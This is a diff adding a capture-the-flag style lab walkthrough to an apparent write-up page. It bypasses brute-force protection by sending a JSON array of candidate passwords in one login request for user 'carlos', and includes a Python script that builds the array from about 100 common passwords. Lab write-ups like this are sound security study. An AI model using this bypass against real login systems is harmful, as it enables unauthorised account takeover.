@@ -96,4 +96,67 @@ And automatically it shows solved
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38123a6b-bac9-492a-b674-a3f050160a32)
 
 
+<h3> Broken brute-force protection, multiple credentials per request </h3>
+
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df0abf24-e21d-4afa-a935-9786792d7b51)
+
+Moving over to the web app shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4a5577ac-d4aa-481e-a721-b9c9fb61163e)
+
+Since the task is to login as user carlos let us go to the login page
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/66e9bcee-fae7-4bb5-8460-16481de430c1)
+
+After trying the username *carlos* with a random password and intercepting it in burp suite I get this request
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/deebfa7f-f55d-4dd3-a7bd-46a16ccb6356)
+
+Notice the way the data is passed to the web server in form of json
+
+```
+{"username":"carlos","password":"deyplay"}
+```
+
+If we try to brute force the password we get rate limited but here's something way more cooler
+
+We know that this is json right?
+
+Therefore we can pass the password values as an array 
+
+So basically the web server will loop through the password variable till it gets the right password
+
+I used python to make it a better json format
+
+Here's my script 
+
+```python
+import json
+
+password_list = [
+    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
+    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
+    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
+    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
+    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
+    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
+    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
+    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
+    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
+    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
+    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
+    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
+    "monitoring", "montana", "moon", "moscow"
+]
+
+json_array = json.dumps(password_list)
+
+print(json_array)
+```
+
+Running it gives us a better json format
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/63299bd1-61aa-486a-b3c2-2ae3c45ada99)
+
+Now I replaced it as the password value in the request 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3443cc8f-3ab2-47db-870c-7ad22f3c79a3)
+
+After forwarding the request I got logged in
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2c1a25b8-2c6c-4624-8de5-2cc007bf63b9)
 
